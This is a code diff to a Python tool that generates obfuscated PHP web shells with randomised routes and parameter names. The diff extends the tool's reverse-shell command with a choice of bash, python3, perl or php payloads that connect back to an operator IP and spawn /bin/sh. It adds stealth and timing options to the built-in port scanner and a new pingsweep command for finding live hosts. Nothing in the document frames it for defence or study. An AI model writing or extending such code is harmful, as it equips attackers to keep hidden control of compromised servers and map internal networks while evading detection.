@@ -281,6 +281,9 @@ def generate_transport_context(rng: random.Random, mode: str) -> dict:
             'p_ip': 'ip', 'p_port_rs': 'port',
             'p_logfile': 'logfile', 'p_pattern': 'pattern',
             'p_target': 'target', 'p_ports_ps': 'ports',
+            'p_mode': 'scan_mode', 'p_timeout': 'scan_timeout',
+            'p_pause': 'scan_pause', 'p_rs_method': 'rs_method',
+            'p_ps_probe': 'ps_probe',
         }
     pool = list(MIMIC_PARAM_POOL)
     rng.shuffle(pool)
@@ -291,6 +294,9 @@ def generate_transport_context(rng: random.Random, mode: str) -> dict:
         'p_ip': pool[6], 'p_port_rs': pool[7],
         'p_logfile': pool[8], 'p_pattern': pool[9],
         'p_target': pool[10], 'p_ports_ps': pool[11],
+        'p_mode': pool[12], 'p_timeout': pool[13],
+        'p_pause': pool[14], 'p_rs_method': pool[15],
+        'p_ps_probe': pool[16],
     }
     if mode == 'rc4':
         rc4_bytes = [rng.randint(0, 255) for _ in range(16)]
@@ -603,15 +609,23 @@ def build_php_section(n, jv, ids, route_param, routes, session_key_val,
     p_pattern  = transport_ctx['p_pattern']
     p_target   = transport_ctx['p_target']
     p_ports_ps = transport_ctx['p_ports_ps']
+    p_mode      = transport_ctx['p_mode']
+    p_timeout   = transport_ctx['p_timeout']
+    p_pause     = transport_ctx['p_pause']
+    p_rs_method = transport_ctx['p_rs_method']
+    p_ps_probe  = transport_ctx['p_ps_probe']
 
     # ── Feature-gated JS interceptors ──
     jfn = jv  # alias used throughout f-string template
     _js_interceptors = []
     if features.get('revshell'):
         _js_interceptors.append(
-            f"            var _rsm = command.match(/^\\s*revshell\\s+(\\S+)\\s+(\\d+)\\s*$/i);\n"
-            f"            if (_rsm) {{\n"
-            f"                {jfn['pipe_call']}(\"?{route_param}={routes['revshell']}\", {{{p_ip}: _rsm[1], {p_port_rs}: _rsm[2]}}, function(r) {{\n"
+            f"            var _rsRaw = command.match(/^\\s*revshell\\s+(\\S+)\\s+(\\d+)(.*)?$/i);\n"
+            f"            if (_rsRaw) {{\n"
+            f"                var _rsMethod = '';\n"
+            f"                var _rsMethodM = (_rsRaw[3] || '').match(/--method\\s+(\\S+)/i);\n"
+            f"                if (_rsMethodM) _rsMethod = _rsMethodM[1];\n"
+            f"                {jfn['pipe_call']}(\"?{route_param}={routes['revshell']}\", {{{p_ip}: _rsRaw[1], {p_port_rs}: _rsRaw[2], {p_rs_method}: _rsMethod}}, function(r) {{\n"
             f"                    {jfn['insert_stdout']}({jfn['b64u']}(r.stdout || \"\"));\n"
             f"                }});\n"
             f"                return;\n"
@@ -629,10 +643,39 @@ def build_php_section(n, jv, ids, route_param, routes, session_key_val,
         )
     if features.get('portscan'):
         _js_interceptors.append(
-            f"            var _psm = command.match(/^\\s*portscan\\s+(\\S+)\\s+(\\S+)\\s*$/i);\n"
-            f"            if (_psm) {{\n"
+            f"            var _psmRaw = command.match(/^\\s*portscan\\s+(\\S+)\\s+(\\S+)(.*)?$/i);\n"
+            f"            if (_psmRaw) {{\n"
+            f"                var _psMode = 'default', _psTout = '', _psPause = '';\n"
+            f"                var _psRest = _psmRaw[3] || '';\n"
+            f"                if (/--stealth/i.test(_psRest)) _psMode = 'stealth';\n"
+            f"                else if (/--fast/i.test(_psRest)) _psMode = 'fast';\n"
+            f"                var _psTM = _psRest.match(/--timeout\\s+(\\S+)/i);\n"
+            f"                if (_psTM) _psTout = _psTM[1];\n"
+            f"                var _psPM = _psRest.match(/--pause\\s+(\\S+)/i);\n"
+            f"                if (_psPM) _psPause = _psPM[1];\n"
             f"                {jfn['insert_stdout']}(\"Scanning...\");\n"
-            f"                {jfn['pipe_call']}(\"?{route_param}={routes['portscan']}\", {{{p_target}: _psm[1], {p_ports_ps}: _psm[2]}}, function(r) {{\n"
+            f"                {jfn['pipe_call']}(\"?{route_param}={routes['portscan']}\", {{{p_target}: _psmRaw[1], {p_ports_ps}: _psmRaw[2], {p_mode}: _psMode, {p_timeout}: _psTout, {p_pause}: _psPause}}, function(r) {{\n"
+            f"                    {jfn['insert_stdout']}({jfn['b64u']}(r.stdout || \"\"));\n"
+            f"                }});\n"
+            f"                return;\n"
+            f"            }}"
+        )
+    if features.get('pingsweep'):
+        _js_interceptors.append(
+            f"            var _pgmRaw = command.match(/^\\s*pingsweep\\s+(\\S+)(.*)?$/i);\n"
+            f"            if (_pgmRaw) {{\n"
+            f"                var _pgMode = 'default', _pgTout = '', _pgPause = '', _pgProbe = '';\n"
+            f"                var _pgRest = _pgmRaw[2] || '';\n"
+            f"                if (/--stealth/i.test(_pgRest)) _pgMode = 'stealth';\n"
+            f"                else if (/--fast/i.test(_pgRest)) _pgMode = 'fast';\n"
+            f"                var _pgTM = _pgRest.match(/--timeout\\s+(\\S+)/i);\n"
+            f"                if (_pgTM) _pgTout = _pgTM[1];\n"
+            f"                var _pgPM = _pgRest.match(/--pause\\s+(\\S+)/i);\n"
+            f"                if (_pgPM) _pgPause = _pgPM[1];\n"
+            f"                var _pgPrM = _pgRest.match(/--ports\\s+(\\S+)/i);\n"
+            f"                if (_pgPrM) _pgProbe = _pgPrM[1];\n"
+            f"                {jfn['insert_stdout']}(\"Sweeping...\");\n"
+            f"                {jfn['pipe_call']}(\"?{route_param}={routes['pingsweep']}\", {{{p_target}: _pgmRaw[1], {p_ps_probe}: _pgProbe, {p_mode}: _pgMode, {p_timeout}: _pgTout, {p_pause}: _pgPause}}, function(r) {{\n"
             f"                    {jfn['insert_stdout']}({jfn['b64u']}(r.stdout || \"\"));\n"
             f"                }});\n"
             f"                return;\n"
@@ -755,6 +798,13 @@ def build_php_section(n, jv, ids, route_param, routes, session_key_val,
         for i, m in enumerate(_ordered)
     )
 
+    # ── Pre-computed pdec expressions for optional params ──
+    _pdec_mode      = pdec(p_mode, "'default'")
+    _pdec_timeout   = pdec(p_timeout, "''")
+    _pdec_pause     = pdec(p_pause, "''")
+    _pdec_rs_method = pdec(p_rs_method, "''")
+    _pdec_ps_probe  = pdec(p_ps_probe, "''")
+
     # ── Switch cases ──
     case_blocks = {
         'shell': (
@@ -794,7 +844,7 @@ def build_php_section(n, jv, ids, route_param, routes, session_key_val,
             f"            $__ip   = {pdec(p_ip)};",
             f"            $__port = (int)({pdec(p_port_rs)});",
             "            if (!filter_var($__ip, FILTER_VALIDATE_IP) || $__port < 1 || $__port > 65535) {",
-            "                $response = ['stdout' => base64_encode('Usage: revshell <IP> <PORT>'), 'cwd' => base64_encode(getcwd())];",
+            "                $response = ['stdout' => base64_encode('Usage: revshell <IP> <PORT> [--method bash|python3|perl|php]'), 'cwd' => base64_encode(getcwd())];",
             "                break;",
             "            }",
             "            $__sent = null;",
@@ -804,6 +854,10 @@ def build_php_section(n, jv, ids, route_param, routes, session_key_val,
             "                'perl'    => 'perl -MSocket -e \\'$i=\"' . $__ip . '\";$p=' . $__port . ';socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh\");\\'',",
             "                'php'     => 'php -r \\'$s=fsockopen(\"' . $__ip . '\",$__port);$p=proc_open(\"/bin/sh\",array(0=>$s,1=>$s,2=>$s),$x);\\'',",
             "            ];",
+            f"            $__force = trim({_pdec_rs_method});",
+            "            if ($__force && isset($__cmds[$__force])) {",
+            "                $__cmds = [$__force => $__cmds[$__force]];",
+            "            }",
             "            foreach ($__cmds as $__bin => $__cmd) {",
             "                if (@shell_exec('which ' . escapeshellarg($__bin) . ' 2>/dev/null')) {",
             "                    if (function_exists('proc_open')) {",
@@ -813,8 +867,8 @@ def build_php_section(n, jv, ids, route_param, routes, session_key_val,
             "                }",
             "            }",
             "            $__out = $__sent",
-            "                ? 'Reverse shell sent via ' . $__sent . ' to ' . $__ip . ':' . $__port . \"\\nEnsure your listener: nc -lvnp \" . $__port",
-            "                : 'No suitable binary found (tried bash, python3, perl, php).';",
+            "                ? 'Reverse shell sent via ' . $__sent . ' to ' . $__ip . ':' . $__port . \"\\nListener: nc -lvnp \" . $__port",
+            "                : ($__force ? \"Method '$__force' not available on this host.\" : 'No suitable binary found (tried bash, python3, perl, php).');",
             "            $response = ['stdout' => base64_encode($__out), 'cwd' => base64_encode(getcwd())];",
             "            break;",
         ]),
@@ -841,14 +895,25 @@ def build_php_section(n, jv, ids, route_param, routes, session_key_val,
         ]),
         'portscan': "\n".join([
             f"        case '{routes['portscan']}':",
-            f"            $__tg = trim({pdec(p_target)});",
-            f"            $__ps = trim({pdec(p_ports_ps)});",
+            f"            $__tg      = trim({pdec(p_target)});",
+            f"            $__ps      = trim({pdec(p_ports_ps)});",
+            f"            $__mode    = trim({_pdec_mode});",
+            f"            $__tout_r  = trim({_pdec_timeout});",
+            f"            $__pause_r = trim({_pdec_pause});",
             "            if (!$__tg || !$__ps) {",
-            "                $response = ['stdout' => base64_encode('Usage: portscan <ip[-lastoctet]> <port[,port|port-port]>'), 'cwd' => base64_encode(getcwd())];",
+            "                $response = ['stdout' => base64_encode('Usage: portscan <ip[-lastoctet]> <port[,port|port-port]> [--stealth|--fast] [--timeout N] [--pause N]'), 'cwd' => base64_encode(getcwd())];",
             "                break;",
             "            }",
+            "            $__presets = [",
+            "                'fast'    => ['t' => 0.1, 'p' => 0],",
+            "                'default' => ['t' => 0.3, 'p' => 0],",
+            "                'stealth' => ['t' => 2.0, 'p' => 500],",
+            "            ];",
+            "            $__pr = $__presets[in_array($__mode, ['fast','stealth']) ? $__mode : 'default'];",
+            "            $__timeout  = ($__tout_r  !== '') ? max(0.05, (float)$__tout_r)  : $__pr['t'];",
+            "            $__pause_ms = ($__pause_r !== '') ? max(0,    (int)$__pause_r)   : $__pr['p'];",
             "            $__ips = [];",
-            "            if (preg_match('/^(\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.)+(\\\\d{1,3})-(\\\\d{1,3})$/', $__tg, $__rm2)) {",
+            "            if (preg_match('/^(\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.)(\\\\d{1,3})-(\\\\d{1,3})$/', $__tg, $__rm2)) {",
             "                for ($__i = (int)$__rm2[2]; $__i <= min((int)$__rm2[3], 254) && count($__ips) < 255; $__i++) $__ips[] = $__rm2[1].$__i;",
             "            } else { $__ips[] = $__tg; }",
             "            $__ports = [];",
@@ -856,10 +921,10 @@ def build_php_section(n, jv, ids, route_param, routes, session_key_val,
             "                $__chunk = trim($__chunk);",
             "                if (strpos($__chunk, '-') !== false) {",
             "                    [$__s, $__e] = explode('-', $__chunk, 2);",
-            "                    for ($__p = (int)$__s; $__p <= min((int)$__e, 65535) && count($__ports) < 100; $__p++) $__ports[] = $__p;",
+            "                    for ($__p2 = (int)$__s; $__p2 <= min((int)$__e, 65535) && count($__ports) < 100; $__p2++) $__ports[] = $__p2;",
             "                } else { $__ports[] = (int)$__chunk; }",
             "            }",
-            "            $__ports = array_unique(array_filter($__ports, fn($__p) => $__p > 0 && $__p <= 65535));",
+            "            $__ports = array_unique(array_filter($__ports, fn($__p2) => $__p2 > 0 && $__p2 <= 65535));",
             "            sort($__ports);",
             "            if (count($__ips) * count($__ports) > 500) {",
             "                $response = ['stdout' => base64_encode('Scan too large (max 500 host:port pairs). Reduce range or port list.'), 'cwd' => base64_encode(getcwd())];",
@@ -868,15 +933,61 @@ def build_php_section(n, jv, ids, route_param, routes, session_key_val,
             "            $__open = []; $__chk = 0;",
             "            foreach ($__ips as $__ip) {",
             "                foreach ($__ports as $__port) {",
-            "                    $__sock = @fsockopen($__ip, $__port, $__en, $__es, 0.3);",
-            "                    if ($__sock) { $__open[] = \"{$__ip}:{$__port}\"; fclose($__sock); }",
+            "                    $__sock = @fsockopen($__ip, $__port, $__en, $__es, $__timeout);",
+            "                    if ($__sock) { $__open[] = \"$__ip:$__port\"; fclose($__sock); }",
             "                    $__chk++;",
+            "                    if ($__pause_ms > 0) usleep($__pause_ms * 1000);",
             "                }",
             "            }",
+            "            $__mode_str = ($__tout_r !== '' || $__pause_r !== '') ? \"custom(t={$__timeout}s,p={$__pause_ms}ms)\" : $__mode;",
             "            $__out2 = count($__open)",
-            "                ? 'Open (' . count($__open) . \"/$__chk):\\n\" . implode(\"\\n\", $__open)",
-            "                : \"No open ports ($__chk host:port pairs checked).\";",
+            "                ? 'Open (' . count($__open) . \"/$__chk) [$__mode_str]:\\n\" . implode(\"\\n\", $__open)",
+            "                : \"No open ports ($__chk pairs checked) [$__mode_str].\";",
             "            $response = ['stdout' => base64_encode($__out2), 'cwd' => base64_encode(getcwd())];",
+            "            break;",
+        ]),
+        'pingsweep': "\n".join([
+            f"        case '{routes['pingsweep']}':",
+            f"            $__tg      = trim({pdec(p_target)});",
+            f"            $__probe_r = trim({_pdec_ps_probe});",
+            f"            $__mode    = trim({_pdec_mode});",
+            f"            $__tout_r  = trim({_pdec_timeout});",
+            f"            $__pause_r = trim({_pdec_pause});",
+            "            if (!$__tg) {",
+            "                $response = ['stdout' => base64_encode('Usage: pingsweep <ip[-lastoctet]> [--ports 80,443,22] [--stealth|--fast] [--timeout N] [--pause N]'), 'cwd' => base64_encode(getcwd())];",
+            "                break;",
+            "            }",
+            "            $__presets = [",
+            "                'fast'    => ['t' => 0.1, 'p' => 0],",
+            "                'default' => ['t' => 0.3, 'p' => 0],",
+            "                'stealth' => ['t' => 1.0, 'p' => 200],",
+            "            ];",
+            "            $__pr = $__presets[in_array($__mode, ['fast','stealth']) ? $__mode : 'default'];",
+            "            $__timeout  = ($__tout_r  !== '') ? max(0.05, (float)$__tout_r)  : $__pr['t'];",
+            "            $__pause_ms = ($__pause_r !== '') ? max(0,    (int)$__pause_r)   : $__pr['p'];",
+            "            $__raw_probe = $__probe_r !== '' ? $__probe_r : '80,443,22';",
+            "            $__probe_ports = array_filter(array_map('intval', explode(',', $__raw_probe)), fn($__p2) => $__p2 > 0 && $__p2 <= 65535);",
+            "            if (!$__probe_ports) $__probe_ports = [80, 443, 22];",
+            "            $__ips = [];",
+            "            if (preg_match('/^(\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.)(\\\\d{1,3})-(\\\\d{1,3})$/', $__tg, $__rm2)) {",
+            "                for ($__i = (int)$__rm2[2]; $__i <= min((int)$__rm2[3], 254) && count($__ips) < 255; $__i++) $__ips[] = $__rm2[1].$__i;",
+            "            } else { $__ips[] = $__tg; }",
+            "            $__up = []; $__chk = 0;",
+            "            foreach ($__ips as $__ip) {",
+            "                $__alive = false;",
+            "                foreach ($__probe_ports as $__pp) {",
+            "                    $__s = @fsockopen($__ip, $__pp, $__en, $__es, $__timeout);",
+            "                    if ($__s) { fclose($__s); $__alive = true; break; }",
+            "                }",
+            "                if ($__alive) $__up[] = $__ip;",
+            "                $__chk++;",
+            "                if ($__pause_ms > 0) usleep($__pause_ms * 1000);",
+            "            }",
+            "            $__mode_str = ($__tout_r !== '' || $__pause_r !== '') ? \"custom(t={$__timeout}s,p={$__pause_ms}ms)\" : $__mode;",
+            "            $__out3 = count($__up)",
+            "                ? 'Up (' . count($__up) . \"/$__chk) [probed: \" . implode(',', $__probe_ports) . \"] [$__mode_str]:\\n\" . implode(\"\\n\", $__up)",
+            "                : \"No hosts up ($__chk checked) [probed: \" . implode(',', $__probe_ports) . \"] [$__mode_str].\";",
+            "            $response = ['stdout' => base64_encode($__out3), 'cwd' => base64_encode(getcwd())];",
             "            break;",
         ]),
     }
@@ -1551,13 +1662,14 @@ def generate(args, info=None):
     # Routing tokens
     route_param = rnd_token(rng, 6)
     routes = {
-        'shell':    rnd_token(rng, 7),
-        'pwd':      rnd_token(rng, 7),
-        'hint':     rnd_token(rng, 7),
-        'upload':   rnd_token(rng, 7),
-        'revshell': rnd_token(rng, 7),
-        'clearlog': rnd_token(rng, 7),
-        'portscan': rnd_token(rng, 7),
+        'shell':     rnd_token(rng, 7),
+        'pwd':       rnd_token(rng, 7),
+        'hint':      rnd_token(rng, 7),
+        'upload':    rnd_token(rng, 7),
+        'revshell':  rnd_token(rng, 7),
+        'clearlog':  rnd_token(rng, 7),
+        'portscan':  rnd_token(rng, 7),
+        'pingsweep': rnd_token(rng, 7),
     }
     session_key_val = rnd_token(rng, 14)
 
@@ -1626,6 +1738,8 @@ def generate(args, info=None):
         case_order.append('clearlog')
     if args.portscan:
         case_order.append('portscan')
+    if args.pingsweep:
+        case_order.append('pingsweep')
     rng.shuffle(case_order)
 
     # Version
@@ -1635,9 +1749,10 @@ def generate(args, info=None):
     transport_ctx = generate_transport_context(rng, args.transport)
 
     features = {
-        'revshell': args.revshell,
-        'clearlog': args.clearlog,
-        'portscan': args.portscan,
+        'revshell':  args.revshell,
+        'clearlog':  args.clearlog,
+        'portscan':  args.portscan,
+        'pingsweep': args.pingsweep,
     }
 
     return build_php_section(
@@ -1694,7 +1809,18 @@ Examples:
                         help='Compile clearlog command into the shell (opt-in; not included by default)')
     parser.add_argument('--portscan', action='store_true', default=False,
                         help='Compile portscan command into the shell (opt-in; not included by default)')
+    parser.add_argument('--pingsweep', action='store_true', default=False,
+                        help='Compile pingsweep command into the shell (opt-in; not included by default)')
+    parser.add_argument('-d', '--outdir', default=None,
+                        help='Output directory. Combined with -o (filename only). E.g. -d /tmp/ -o shell.php → /tmp/shell.php')
     args = parser.parse_args()
+
+    import os
+    if args.outdir:
+        outname = os.path.basename(args.output) if args.output != 'shell.php' else 'shell.php'
+        args.output = os.path.join(args.outdir.rstrip('/'), outname or 'shell.php')
+    elif os.path.isdir(args.output):
+        args.output = os.path.join(args.output, 'shell.php')
 
     if args.junk is not None and (args.junk < 0 or args.junk > 200):
         parser.error('--junk must be between 0 and 200')
